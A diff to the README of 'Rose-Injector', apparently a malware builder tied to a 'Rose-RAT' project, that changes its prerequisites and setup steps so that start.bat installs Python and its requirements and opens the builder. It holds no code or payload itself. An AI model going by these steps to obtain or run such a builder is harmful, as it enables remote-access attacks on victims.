@@ -75,8 +75,8 @@ You can check [this](https://github.com/DamagingRose/Rose-RAT) for informations
 ### <a id="prerequisites"></a> 💻 〢 Prerequisites
 
 -   Windows 7/10/11
--   **[Python](https://www.python.org)**
--   PyPi requirements
+-   **[Python](https://www.python.org) (Is automatically being installed when running start.bat.)**
+-   PyPi requirements **(Is automatically being installed when opening the builder through running start.bat.)**
 
 
 ### <a id="setup"></a> ⚙️ Setup
@@ -84,7 +84,7 @@ You can check [this](https://github.com/DamagingRose/Rose-RAT) for informations
 Don't forget that the project is still under development release and might contain bugs.
 
 * [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
-* Run the start.bat to open up the Rose builder.
+* Run the start.bat to open up the Rose builder/Python installer.
 * Enjoy!
 
 ## <a id="preview"></a> 📷 〢 Preview
